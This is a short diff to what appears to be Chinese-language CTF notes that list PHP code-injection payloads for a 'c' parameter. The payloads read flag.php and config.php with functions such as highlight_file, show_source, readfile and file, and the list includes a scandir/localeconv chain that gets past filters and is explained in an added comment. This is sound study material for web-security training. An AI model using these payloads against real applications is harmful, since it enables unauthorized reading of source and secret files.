@@ -29,9 +29,12 @@ c=highlight_file("config.php");        //文件内容包含高亮。
 c=highlight_file($_GET[1])&1=flag.php
 
 c=show_source('flag.php');
-c=highlight_file(next(array_reverse(scandir(pos(localeconv())))));
+
 c=print_r(scandir(dirname('__FILE__')));
 // ( [0] => 。 [1] => .. [2] => flag.php [3] => index.php ) 
+//要读倒数第二个，即反转后读下一个。
+c=highlight_file(next(array_reverse(scandir(pos(localeconv())))));
+
 c=var_dump(file('flag.php'));
 c=readfile('flag.php');
 c=print_r(file('flag.php'));
